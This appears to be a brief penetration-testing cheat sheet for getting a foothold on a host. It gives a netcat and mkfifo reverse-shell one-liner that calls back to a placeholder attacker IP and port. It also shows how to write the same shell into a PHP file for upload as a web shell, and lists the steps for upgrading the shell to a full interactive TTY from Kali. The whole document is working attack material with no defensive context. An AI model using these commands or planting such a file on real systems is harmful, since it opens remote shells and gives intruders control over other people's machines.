Reverse shell foothold

	bash string 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc SERV.IP.ADD.RESS PORT >/tmp/f'

creating a php file for upload

	vim <filename>.php
	--php line
	<?php system ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT> >/tmp/f'); ?>
	
	# TTY Upgrade 1	
	python bash spawn : [python3 -c 'import pty; pty.spawn("/bin/bash")']
	# In reverse shell
	$ python -c 'import pty; pty.spawn("/bin/bash")'
	Ctrl-Z
	
	# In Kali
	$ stty raw -echo
	$ fg
	
	# In reverse shell
	$ reset
	$ export SHELL=bash
	$ export TERM=xterm-256color
	$ stty rows <num> columns <cols>
